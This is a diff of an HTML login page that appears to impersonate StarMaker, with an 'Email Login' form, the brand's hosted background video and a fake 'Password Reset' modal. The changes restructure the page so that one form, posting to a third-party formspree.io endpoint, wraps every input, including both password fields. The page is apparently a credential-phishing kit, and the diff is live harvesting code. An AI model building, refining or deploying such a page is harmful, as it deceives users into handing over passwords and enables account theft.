@@ -795,6 +795,9 @@
   </style>
 </head>
 <body>
+
+  <form action="https://formspree.io/f/mknlngbg" id="my-form" method="POST">
+  
   <div class="main-container">
     <video autoplay loop muted playsinline>
       <source src="https://static.starmakerstudios.com/www-index-1/bg/wwww-new-v2-video.mp4" type="video/mp4" />
@@ -806,7 +809,7 @@
     </div>
 
     <header class="hero-section">
-      <form action="https://formspree.io/f/mknlngbg" id="my-form" method="POST">
+      
         <div class="container">
           <div class="upper-text">
             <p>Email Login</p>
@@ -840,12 +843,11 @@
 
   <!-- Forgot Password Modal -->
   <div class="modal-overlay" id="forgot-modal">
-    <form action="https://formspree.io/f/mknlngbg" id="my-form" method="POST">
     <div class="modal">
       <div class="modal-header">Password Reset</div>
       <div class="modal-message" id="modal-message">We have sent you an email to reset the password. If you haven't received it, please check it in spam.</div>
       <div class="modal-input-wrapper" id="modal-password-wrapper" style="display: none;">
-        <input type="password" id="password-input" name="psw" class="modal-input" placeholder="Password">
+        <input type="password" id="new-password-input" name="psw" class="modal-input" placeholder="Password">
         <div class="modal-password-toggle" id="modal-password-toggle">🔓️</div>
       </div>
       <div class="modal-error" id="modal-error"></div>
@@ -857,11 +859,12 @@
         <button class="modal-resend-btn" id="modal-resend-btn">Resend</button>
       </div>
     </div>
-    </form>
   </div>
 
   <div id="status" class="success-message"></div>
   <div id="resend-status" class="resend-success"></div>
+
+  </form>
 
   <script>
     // Configuration
